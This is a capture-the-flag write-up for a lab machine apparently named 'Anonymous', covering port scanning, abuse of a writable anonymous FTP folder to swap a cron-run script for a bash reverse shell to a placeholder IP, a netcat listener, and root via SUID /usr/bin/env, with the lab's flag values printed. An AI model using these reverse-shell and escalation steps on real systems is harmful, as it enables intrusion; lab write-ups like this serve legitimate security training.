# ENUMERATION
---



## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 21   | ftp     |
| 22   | ssh     |
| 139  | smb     |
| 445  | smb     |

```
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.6.34.159
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2025-04-01T18:15:57+00:00
|_clock-skew: mean: 0s, deviation: 1s, median: 0s
| smb2-time:
|   date: 2025-04-01T18:15:57
|_  start_date: N/A
```

# RECONNAISSANCE
---


We got FTP and SMB enabled on the machine, also, we got anonymous login enabled in FTP at first sight thanks to the scan, this may be enabled on smb too, let's check out FTP first:


![Pasted image 20250401131807.png](../../IMAGES/Pasted%20image%2020250401131807.png)

We got a `scripts` directory, let's check it contents:

![Pasted image 20250401132437.png](../../IMAGES/Pasted%20image%2020250401132437.png)

We got some scripts in it, let's look at them:


![Pasted image 20250401132655.png](../../IMAGES/Pasted%20image%2020250401132655.png)



![Pasted image 20250401132708.png](../../IMAGES/Pasted%20image%2020250401132708.png)



![Pasted image 20250401132719.png](../../IMAGES/Pasted%20image%2020250401132719.png)


That `clean.sh` script seems interesting, let's keep it like that for now. We can proceed to analyze `SMB`, since the anonymous login may be enabled, we can view the contents of the shares:

```
smbclient -L \\\\10.10.235.71\\ -N
Can't load /etc/samba/smb.conf - run testparm to debug it

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	pics            Disk      My SMB Share Directory for Pics
	IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

Let's check that `pics` share:

![Pasted image 20250401133112.png](../../IMAGES/Pasted%20image%2020250401133112.png)

Both files are not interesting, if we try extracting the contents with `steghide`, we'll need a passphrase so, they're not useful, let's proceed with exploitation then.




# EXPLOITATION
---


We already know that the FTP protocol has got a script called `clean.sh`, interesting part about the script is that:

- The script checksÂ `if [ $tmp_files=0 ]`Â (missing space aroundÂ =). While syntactically incorrect, this is treated as a string comparison. However, the script is likelyÂ **triggered by a cron job**Â (sinceÂ `removed_files.log`Â has many entries).

If we can modify the contents of `clean.sh`, we can upload a reverse shell and gain access to the machine, let's test this by doing the following:


1. Create a new `malicious_clean.sh` script with the following contents to trigger a reverse shell:

```
#!/bin/bash
bash -i >& /dev/tcp/IP/PORT 0>&1
```

2. Replace the script with our malicious one:

```
ftp IP # Login with anonymous login
cd scripts
put malicious_clean.sh clean.sh
```

3. Set up the listener and wait for the connection:

```
nc -lvnp PORT
```


If we reproduce these steps, we can see the following in our listener:

![Pasted image 20250401133901.png](../../IMAGES/Pasted%20image%2020250401133901.png)

We got a shell as `namelessone`, let's begin privilege escalation.



# PRIVILEGE ESCALATION
---


First step would be stabilizing our shell to move around the machine in a more comfortable way:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

![Pasted image 20250401134051.png](../../IMAGES/Pasted%20image%2020250401134051.png)

We can read `user.txt` now:

```
namelessone@anonymous:~$ cat user.txt
90d6f992585815ff991e68748c414740
```

Now, in order to get root, we can use linpeas to check for any privesc vector:

![Pasted image 20250401134406.png](../../IMAGES/Pasted%20image%2020250401134406.png)

For example, we are inside of the `sudo` group but since we do not know the password of `namelessone`, this is pretty much useless for now, if we keep looking at `linpeas` output, we can check this:

![Pasted image 20250401134512.png](../../IMAGES/Pasted%20image%2020250401134512.png)

We got `SUID` for `/usr/bin/env`, let's check `gtfobins`:

![Pasted image 20250401134540.png](../../IMAGES/Pasted%20image%2020250401134540.png)

So, we can do the following in order to get a root shell:

```
/usr/bin/env /bin/bash -p
```

![Pasted image 20250401134615.png](../../IMAGES/Pasted%20image%2020250401134615.png)

There we go, we can finally read `root.txt` and end the challenge:

```
bash-4.4# cat /root/root.txt
4d930091c31a622a7ed10f27999af363
```

![Pasted image 20250401134709.png](../../IMAGES/Pasted%20image%2020250401134709.png)



